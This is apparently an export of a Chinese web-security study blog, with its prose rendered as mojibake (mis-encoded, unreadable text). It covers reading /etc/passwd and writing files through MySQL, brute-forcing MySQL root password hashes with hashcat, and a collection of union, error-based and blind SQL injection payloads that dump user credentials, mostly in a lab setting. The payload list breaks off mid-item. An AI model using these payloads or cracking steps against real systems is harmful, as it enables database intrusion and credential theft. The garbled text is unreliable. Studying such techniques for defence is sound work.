<p>æŸ¥çœ‹secure_file_privçš„å€¼ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63ycnyqg5j20dd03mq30.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°secure_file_privçš„å€¼ä¸º<code>/var/lib/mysql-files</code></p>
<blockquote>
<p>â‘  secure_file_privä¸ºNULLæ—¶ï¼Œè¡¨ç¤ºä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼›<br>
â‘¡ secure_file_privæŒ‡å®šæ–‡ä»¶å¤¹æ—¶ï¼Œè¡¨ç¤ºmysqlçš„å¯¼å…¥å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨æŒ‡å®šçš„æ–‡ä»¶å¤¹ï¼›<br>
â‘¢ secure_file_privæ²¡æœ‰è®¾ç½®æ—¶ï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰ä»»ä½•é™åˆ¶</p>
</blockquote>
<p><strong>åœ¨ä¸æ”¹å˜secure_file_privå€¼çš„æƒ…å†µä¸‹å¦‚ä½•è¯»æ–‡ä»¶ï¼š</strong></p>
<p>å¯ä»¥æ–°å»ºä¸€ä¸ªè¡¨ï¼Œæˆ–è€…ç›´æ¥æŠŠè¦è¯»æ–‡ä»¶çš„å†…å®¹intoåˆ°å·²æœ‰çš„å­—ç¬¦ç±»å‹çš„è¡¨ä¸­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table mytable(a VARCHAR(100), b VARCHAR(100), c VARCHAR(100), d VARCHAR(100), e VARCHAR(100), f VARCHAR(100), g VARCHAR(100));</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63z0tqvswj20qc01pmx7.jpg" alt=""></p>
<p>ä½¿ç”¨load data infileè¯»å–æ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE &quot;&#x2F;etc&#x2F;passwd&quot; INTO TABLE mytable;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63z2vt4r8j20fv01n0su.jpg" alt=""></p>
<p>æŸ¥çœ‹åˆšåˆšè¯»å…¥çš„æ–‡ä»¶ï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/R8vDHQPGUFsL14A.png" alt=""></p>
<p><strong>åœ¨æ”¹å˜secure_file_privå€¼çš„æƒ…å†µä¸‹å¦‚ä½•è¯»æ–‡ä»¶ï¼š</strong></p>
<p>ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶<code>etc/mysql/my.cnf</code>ï¼Œåœ¨[mysqld]ä¸‹æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_file_priv&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>å†é‡å¯mysqlæœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure>
<p>åœ¨mysqlå‘½ä»¤è¡Œä¸­æŸ¥çœ‹<code>secure_file_priv</code>çš„å€¼ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63zybibb1j20bl03kq2y.jpg" alt=""></p>
<p>ä¿®æ”¹æˆåŠŸï¼</p>
<p>ä½¿ç”¨load_file()è¯»å–æ–‡ä»¶ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g641rti54aj20ae04m74d.jpg" alt=""></p>
<blockquote>
<p><strong>åœ¨Ubuntu-18.04ä½¿ç”¨ MySQL æ—¶é»˜è®¤çš„ç³»ç»Ÿç”¨æˆ·æ˜¯ <code>mysql</code>ï¼Œæ‰€ä»¥å¿…é¡»æŠŠè¦è¯»å–çš„æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œç”¨æˆ·ç»„ä¿®æ”¹ä¸º<code>mysql</code></strong></p>
</blockquote>
</li>
</ol>
<h3 id="äºŒã€åˆ©ç”¨æ•°æ®åº“å†™å…¥æ–‡ä»¶">äºŒã€åˆ©ç”¨æ•°æ®åº“å†™å…¥æ–‡ä»¶</h3>
<p><code>SELECT INTO OUTFILE</code> å’Œ <code>LOAD DATA</code> è¿™ä¸¤æ¡è¯­å¥æ˜¯å®Œå…¨äº’è¡¥çš„ï¼Œä¸€ä¸ªå†™æ–‡ä»¶ï¼Œä¸€ä¸ªè¯»æ–‡ä»¶ï¼Œè¯­å¥çš„è¯­æ³•ä¹Ÿå¾ˆç›¸ä¼¼ã€‚</p>
<p><strong>å‰ææ¡ä»¶ï¼š</strong></p>
<ul>
<li><code>secure_file_priv</code> ä¸ä¸º <code>NULL</code>ï¼Œä½¿ç”¨ <code>select @@secure_file_priv</code>æŸ¥çœ‹å…¶å€¼ï¼Œå€¼ä¸ä¸ºç©ºå­—ç¬¦ä¸²æ—¶ï¼Œåªèƒ½ä½¿ç”¨è¯¥ç›®å½•è¿›è¡Œæ–‡ä»¶çš„è¯»å†™æ“ä½œï¼Œ è¯¥å€¼çš„è®¾ç½®è§[é™„å½•](<a href="https://bingslient.github.io/2019/08/16/MySQL">https://bingslient.github.io/2019/08/16/MySQL</a> æ•°æ®åº“ç³»ç»Ÿè¡¨çš„åˆ©ç”¨/#é™„å½•)ï¼›</li>
<li>å½“å‰æ•°æ®åº“ç”¨æˆ·å…·æœ‰ <code>FILE</code> æƒé™ï¼Œä½¿ç”¨ <code>show grants</code>æŸ¥çœ‹ï¼›</li>
<li>ç³»ç»Ÿç”¨æˆ· <code>mysql</code> å¯¹è¯¥æ–‡ä»¶å¯å†™ï¼ˆè¦è€ƒè™‘ç³»ç»Ÿçš„è®¿é—®æ§åˆ¶ç­–ç•¥ï¼‰ï¼Œåœ¨Ubuntu-18.04ä½¿ç”¨ MySQL æ—¶é»˜è®¤çš„ç³»ç»Ÿç”¨æˆ·æ˜¯ <code>mysql</code>ï¼›</li>
<li>è¯»å–æ–‡ä»¶çš„å¤§å°å°äº <code>max_allowed_packet</code>ï¼Œä½¿ç”¨ <code>select @@max_allowed_packet</code>æŸ¥çœ‹ï¼›</li>
<li>æ–‡ä»¶ä¸å­˜åœ¨ã€‚</li>
</ul>
<p>å°†æ•°æ®åº“ä¸­çš„æŸä¸€ä¸ªè®°å½•å†™å…¥<code>/tmp/customer.csv</code>æ–‡ä»¶ä¸­ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g642bna6a0j20no06gaaf.jpg" alt=""></p>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/ZbaRjsf2klK3otd.png" alt=""></p>
<blockquote>
<p>ä½¿ç”¨ <code>SELECT INTO DUMPFILE</code> å¯å°†æ–‡ä»¶å†…å®¹å†™æˆä¸€è¡Œã€‚</p>
</blockquote>
<blockquote>
<p>å¦‚æœæƒ³æŠŠè¿œç¨‹æ•°æ®åº“çš„æŸ¥è¯¢ç»“æœå†™åˆ°æœ¬åœ°ä¸»æœºæ–‡ä»¶ä¸Š, å¯ç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;mysql -h hostname -P portnum -u username -p databsename -e &quot;SELECT ...&quot; &gt; file_name</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="0x03-ç”¨æˆ·å¯†ç çˆ†ç ´">0x03 ç”¨æˆ·å¯†ç çˆ†ç ´</h2>
<p>MySQL ç”¨æˆ·çš„å¯†ç å­˜å‚¨æ–¹å¼å¹¶éæ˜æ–‡ç›´æ¥å­˜å‚¨ï¼Œè€Œæ˜¯ç»è¿‡ hash å‡½æ•°åŠ å¯†è¿›è¡Œå­˜å‚¨çš„ï¼Œä» <code>mysql.user</code>ä¸­è·å–åˆ° MySQL ç”¨æˆ·å¯†ç çš„å“ˆå¸Œå€¼åï¼Œéœ€è¦ä½¿ç”¨å·¥å…·è¿›è¡Œç ´è§£ã€‚</p>
<p>é¦–å…ˆæŸ¥è¯¢<code>root</code>ç”¨æˆ·å¯†ç çš„Hashå€¼ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g646f0wllhj20g7050t97.jpg" alt=""></p>
<p><strong>å·¥å…·ï¼š</strong><a href="https://github.com/hashcat/hashcat">hashcat</a></p>
<blockquote>
<p>hashcat å·ç§°æœ€å¿«çš„é«˜çº§å¯†ç æ¢å¤å¥—æœºï¼ˆå¯†ç ç ´è§£å·¥å…·ï¼‰ï¼Œæ”¯æŒå¤šç³»ç»Ÿï¼ˆLinuxï¼ŒOSï¼ŒWindowsï¼‰ï¼Œå¤šå¹³å°ï¼ˆGPUï¼ŒCPUï¼ŒDSPç­‰ï¼‰ï¼Œæ”¯æŒå¤šè¾¾ 200 å¤šç§çš„ Hash ç±»å‹ï¼Œæ”¯æŒä½¿ç”¨åŒä¸€ç³»ç»Ÿçš„ä¸åŒè®¾å¤‡ï¼Œæ”¯æŒåˆ†å¸ƒå¼ç³»ç»Ÿèµ„æºç­‰ï¼Œé‡è¦çš„æ˜¯å¼€æºå•Šï¼</p>
</blockquote>
<p><strong>ä½¿ç”¨ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hashcat64.exe -m 300 -a 3 hashcode -o plaintxt --outfile-format=2 ?a?a?a?a?a?a</span><br></pre></td></tr></table></figure>
<p>å‚æ•°è§£é‡Šï¼š</p>
<ul>
<li>
<p><code>-m 300</code>ï¼šhash ç±»å‹ï¼Œ300 é€‰æ‹©çš„æ˜¯ MySQL4/5 çš„hash</p>
</li>
<li>
<p><code>-a 3</code>ï¼šæ”»å‡»æ¨¡å¼ï¼Œ3ä»£è¡¨çˆ†ç ´æ¨¡å¼</p>
<blockquote>
<p>è½¯ä»¶ä¸€å…±æ”¯æŒ5ç§ç ´è§£æ¨¡å¼ï¼Œåˆ†åˆ«ä¸º:</p>
<p>0 Straightï¼ˆå­—å…¸ç ´è§£ï¼‰<br>
1 Combinationï¼ˆç»„åˆç ´è§£ï¼‰<br>
3 Brute-forceï¼ˆæ©ç æš´åŠ›ç ´è§£ï¼‰<br>
6 Hybrid dict + maskï¼ˆæ··åˆå­—å…¸+æ©ç ï¼‰<br>
7 Hybrid mask + dictï¼ˆæ··åˆæ©ç +å­—å…¸ï¼‰</p>
</blockquote>
</li>
<li>
<p><code>-o pliantxt</code> ï¼šç ´è§£åè¾“å‡ºåˆ°æ–‡ä»¶ plaintxt</p>
</li>
<li>
<p><code>--outfile-format=2</code>ï¼šè¾“å‡ºæ–‡ä»¶æ ¼å¼ï¼Œ2è¡¨ç¤ºåªè¾“å‡ºç ´è§£åçš„å†…å®¹</p>
</li>
<li>
<p><code>?a?a?a?a?a?a</code>ï¼šè¿™è¡¨ç¤ºå¯†ç çš„æ©ç ï¼Œæ‰€è°“çš„æ©ç å°±æ˜¯é€šè¿‡ ?[å­—ç¬¦é›†ä»£å·]â€¦ çš„æ ¼å¼è¡¨ç¤ºå¯†ç çš„æ ¼å¼ï¼ŒåŒ…æ‹¬å¯†ç çš„ä½æ•°å’Œæ¯ä¸€ä½å¯†ç ä½¿ç”¨çš„å­—ç¬¦é›†ã€‚?a è¡¨ç¤ºæ‰€æœ‰çš„é”®ç›˜ä¸Šå¯è¾“å…¥çš„å­—ç¬¦ï¼Œ6ä¸ª?aè¡¨ç¤ºå¯†ç æœ‰6ä½ã€‚</p>
<blockquote>
<p>hashcat å†…ç½®å­—ç¬¦é›†å¦‚ä¸‹ï¼š</p>
<p>?l = abcdefghijklmnopqrstuvwxyz</p>
<p>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ</p>
<p>?d = 0123456789</p>
<p>?h = 0123456789abcdef</p>
<p>?H = 0123456789ABCDEF</p>
<p>?s = !â€#$%&amp;â€™()*+,-./:;&lt;=&gt;?@[]^_`{</p>
<p>?a = ?l?u?d?s</p>
<p>?b = 0x00 - 0xff</p>
</blockquote>
<p>å¦‚æœè¦ç”¨æ©ç è¡¨ç¤ºå°å†™+æ•°å­—æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ°è‡ªå®šä¹‰å­—ç¬¦é›†è¿™ä¸ªå‚æ•°äº†ã€‚è½¯ä»¶æ”¯æŒç”¨æˆ·æœ€å¤šå®šä¹‰4ç»„å­—ç¬¦é›†ï¼Œåˆ†åˆ«ç”¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--custom-charset1 [chars]</span><br><span class="line">--custom-charset2 [chars]</span><br><span class="line">--custom-charset3 [chars]</span><br><span class="line">--custom-charset4 [chars]</span><br></pre></td></tr></table></figure>
<p>æ¯”å¦‚è¯´æˆ‘è¦è®¾ç½®è‡ªå®šä¹‰å­—ç¬¦é›†1ä¸ºå°å†™+æ•°å­—ï¼Œé‚£ä¹ˆå°±åŠ ä¸Š:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- custom-charset1 ?l?d</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>å¯¹äºæƒ³è¦ç ´è§£ä¸€äº›æœªçŸ¥é•¿åº¦çš„å¯†ç ï¼Œå¸Œæœ›è½¯ä»¶åœ¨ä¸€å®šé•¿åº¦èŒƒå›´å†…è¿›è¡Œå°è¯•çš„ï¼Œå¯ä»¥ä½¿ç”¨â€“incrementå‚æ•°ï¼Œå¹¶ä¸”ä½¿ç”¨â€“increment-min ?å®šä¹‰æœ€çŸ­é•¿åº¦ï¼Œä½¿ç”¨â€“increment-max ?å®šä¹‰æœ€å¤§é•¿åº¦ã€‚æ¯”å¦‚è¦å°è¯•6-8ä½å°å†™å­—æ¯ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure>
<p><strong>çˆ†ç ´ç»“æœï¼š</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g646w12n96j208u02rt8j.jpg" alt=""></p>
<blockquote>
<p>æœ€æ–°ç‰ˆæœ¬çš„MySQLåœ¨é…ç½®å¯†ç è§„åˆ™æ˜¯è¦æ±‚å¯†ç é•¿åº¦æœ€å°ä¸º8ä½ï¼Œä½†æ˜¯æˆ‘è¿™ç ´ç”µè„‘ç”¨hashcatçˆ†ç ´8ä½å¯†ç é¢„è®¡éœ€è¦1å¹´çš„æ—¶é—´ï¼Œåªèƒ½å¼ºè¡ŒæŠŠå¯†ç æœ€å°é•¿åº¦æ”¹ä¸º6ä½ï¼Œ15åˆ†é’Ÿè§£å†³é—®é¢˜ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>MySQL</tag>
        <tag>hashçˆ†ç ´</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ </title>
    <url>/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ ">Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ </h1>
<h2 id="ä»»åŠ¡ç›®æ ‡">ä»»åŠ¡ç›®æ ‡</h2>
<ol>
<li>æ”¶é›†ç½‘ç»œä¸Šå„ç§sqlæ³¨å…¥æ—¶ä½¿ç”¨çš„payloadå¹¶ç†è§£å…¶é€‚ç”¨çš„ç¯å¢ƒï¼ˆæ£€æµ‹æ³¨å…¥ã€åˆ©ç”¨æ³¨å…¥ï¼‰ï¼›</li>
<li>è®°å½•sqlmapçš„æ£€æµ‹å’Œåˆ©ç”¨è¿‡ç¨‹ä¸­ä½¿ç”¨çš„payloadï¼›</li>
<li>ç†è§£ä»¥ä¸Šæ¶‰åŠçš„sqlè¯­å¥çš„æ„æ€ï¼Œå…¶ä¸­ä¼šæ¶‰åŠä¸åŒçš„æ•°æ®åº“ã€ä¸åŒæ³¨å…¥åœºæ™¯ã€‚å°†æ”¶é›†æ–¹å¼å’Œå­¦ä¹ è¿‡ç¨‹æ•´ç†å½¢æˆæŠ¥å‘Šï¼›</li>
<li>æ‰©å±•å­¦ä¹ ï¼šç†è§£sqlmapè‡ªå¸¦tamperçš„åŸç†</li>
</ol>
<h2 id="0x01-Payloadæ”¶é›†">0x01 Payloadæ”¶é›†</h2>
<blockquote>
<p>ä»¥ä¸‹payloadséƒ½åŸºäºå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ã€‚è‹¥æ˜¯æ•´å‹æ³¨å…¥åˆ™æŠŠå•å¼•å·å’Œæ³¨é‡Šç¬¦ï¼ˆâ€“+ï¼‰å»æ‰ï¼Œè‹¥æ˜¯åŒå¼•å·æ³¨å…¥åˆ™æŠŠå•å¼•å·æ¢æˆåŒå¼•å·ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬æŠŠæ³¨å…¥åœºæ™¯åˆ†ä¸ºï¼š</p>
<ul>
<li>è”åˆæŸ¥è¯¢æ³¨å…¥</li>
<li>æŠ¥é”™å‹æ³¨å…¥</li>
<li>å¸ƒå°”ç›²æ³¨</li>
<li>æ—¶é—´ç›²æ³¨</li>
</ul>
<h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥">è”åˆæŸ¥è¯¢æ³¨å…¥</h3>
<h4 id="ä½¿ç”¨åœºæ™¯">ä½¿ç”¨åœºæ™¯</h4>
<p>é¡µé¢ä¸Šæœ‰æ˜¾ç¤ºä½</p>
<blockquote>
<p>ä»€ä¹ˆæ˜¯æ˜¾ç¤ºä½ï¼š åœ¨ä¸€ä¸ªåœ¨ä¸€ä¸ªç½‘ç«™çš„æ­£å¸¸é¡µé¢ï¼ŒæœåŠ¡ç«¯æ‰§è¡ŒSQLè¯­å¥æŸ¥è¯¢æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå®¢æˆ·ç«¯å°†æ•° æ®å±•ç¤ºåœ¨é¡µé¢ä¸­ï¼Œè¿™ä¸ªå±•ç¤ºæ•°æ®çš„ä½ç½®å°±å«æ˜¾ç¤ºä½ ã€‚</p>
</blockquote>
<h4 id="Payload">Payload</h4>
<ol>
<li>
<p>åˆ¤æ–­å½“å‰æ•°æ®è¡¨ä¸­æœ‰å‡ åˆ—ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by æ•°å€¼ --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥çœ‹æ˜¾ç¤ºä½åœ¨ç¬¬å‡ åˆ—ï¼ˆå‡è®¾ä¸€å…±ä¸‰åˆ—ï¼‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„ï¼šè¿™é‡Œå¿…é¡»æ˜¯æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„è®°å½•æ‰èƒ½èµ·ä½œç”¨ã€‚</p>
</blockquote>
</li>
<li>
<p>æ˜¾ç¤ºå½“å‰æ•°æ®åº“ï¼ˆå‡è®¾æ˜¾ç¤ºä½ä¸­åŒ…å«ç¬¬ä¸‰ä½ï¼‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å‡½æ•°<code>group_concat()</code>æŠŠæ‰€æœ‰ç»“æœéƒ½åœ¨ä¸€è¡Œè¾“å‡º</p>
</blockquote>
</li>
<li>
<p>æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸­çš„è¡¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢æŸä¸ªè¡¨ä¸­çš„æ‰€æœ‰å­—æ®µï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢æŸä¸ªè¡¨ä¸­çš„å­—æ®µå†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>0x3aä¼šè¢«è½¬ä¹‰ä½å†’å·<code>ï¼š</code></p>
</blockquote>
</li>
</ol>
<h2 id="æŠ¥é”™å‹æ³¨å…¥">æŠ¥é”™å‹æ³¨å…¥</h2>
<h3 id="ä½¿ç”¨åœºæ™¯-v2">ä½¿ç”¨åœºæ™¯</h3>
<p>é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ä½†æ˜¯æœ‰sqlè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯è¾“å‡ºã€‚</p>
<h4 id="Payload-v2">Payload</h4>
<p>ä¸»è¦æœ‰ä¸‰ç§SQLæ³¨å…¥æŠ¥é”™æ–¹å¼ï¼š</p>
<ul>
<li>ExtractValue</li>
<li>UpdateXml</li>
<li>floor</li>
</ul>
<h5 id="ExtractValue">ExtractValue</h5>
<p>é¦–å…ˆæ¥çœ‹<code>ExtractValue()</code>å‡½æ•°ï¼Œå®ƒæ¥å—ä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥ç›®æ ‡xmlæ–‡æ¡£ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨Xpathè·¯å¾„æ³•è¡¨ç¤ºçš„æŸ¥æ‰¾è·¯å¾„ã€‚è¿™é‡Œå¦‚æœXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ã€‚è¿™é‡Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çŸ¥é“çš„å†…å®¹ã€‚ ä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, &#39;~&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~&#39;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨concatå‡½æ•°å°†æƒ³è¦è·å¾—çš„æ•°æ®åº“å†…å®¹æ‹¼æ¥åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼ŒæŠ¥é”™æ—¶ä½œä¸ºå†…å®¹è¾“å‡ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, concat(&#39;~&#39;, (select database())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;</span><br></pre></td></tr></table></figure>
<h5 id="UpdateXml">UpdateXml</h5>
<p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code></p>
<p><strong>xml_target:ï¼š</strong> éœ€è¦æ“ä½œçš„xmlç‰‡æ®µ</p>
<p><strong>xpath_exprï¼š</strong> éœ€è¦æ›´æ–°çš„xmlè·¯å¾„(Xpathæ ¼å¼)</p>
<p><strong>new_xmlï¼š</strong> æ›´æ–°åçš„å†…å®¹</p>
<p>ä¸è¿‡è¿™äº›å‚æ•°éƒ½ä¸å¤ªé‡è¦ï¼Œè¿™é‡Œå’Œä¸Šé¢çš„extractvalueå‡½æ•°ä¸€æ ·ï¼Œå½“Xpathè·¯å¾„è¯­æ³•é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å†…å®¹å«æœ‰é”™è¯¯çš„è·¯å¾„å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select database())), &#39;test&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select version())), &#39;test&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.27-0ubuntu0.18.0.1&#39;</span><br></pre></td></tr></table></figure>
<h5 id="Floor">Floor</h5>
<p>æœ‰å…³<code>floor()</code>å‡½æ•°çš„æ³¨å…¥åŸç†å¯ä»¥çœ‹<a href="https://ca0y1h.top/2019/09/17/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">è¿™ç¯‡æ–‡ç« </a>ã€‚</p>
<p>å›ºå®šæ ¼å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((******), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<p><code>******</code>æ›¿æ¢ä¸ºæŸ¥è¯¢è¯­å¥å³å¯ã€‚</p>
<ol>
<li>
<p>æŸ¥è¯¢æ•°æ®åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸­çš„è¡¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1, 1), floor(rand()*2)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;, limit 1,1), floor(rand()*2)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from security.users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>ä¿®æ”¹limit x,1 å¯ä»¥æ˜¾ç¤ºç¬¬xä¸ªç”¨æˆ·çš„passwordå’Œusernameã€‚</p>
</blockquote>
<h3 id="å¸ƒå°”ç›²æ³¨">å¸ƒå°”ç›²æ³¨</h3>
<h4 id="ä½¿ç”¨åœºæ™¯-v3">ä½¿ç”¨åœºæ™¯</h4>
<p>é¡µé¢æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä¹Ÿæ²¡æœ‰SQLè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯ï¼Œåªèƒ½é€šè¿‡é¡µé¢è¿”å›æ˜¯å¦æ­£å¸¸æ¥åˆ¤æ–­æ³¨å…¥ç‚¹ã€‚</p>
<h4 id="Payload-v3">Payload</h4>
<blockquote>
<p>æœ‰ç”¨åˆ°äºŒåˆ†æ³•çš„æ€æƒ³</p>
</blockquote>
<h5 id="æ•°æ®åº“åç›¸å…³">æ•°æ®åº“åç›¸å…³</h5>
<ol>
<li>
<p>æŸ¥è¯¢æ•°æ®åº“ä¸ªæ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(schema_name) from information_schema.schemata) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
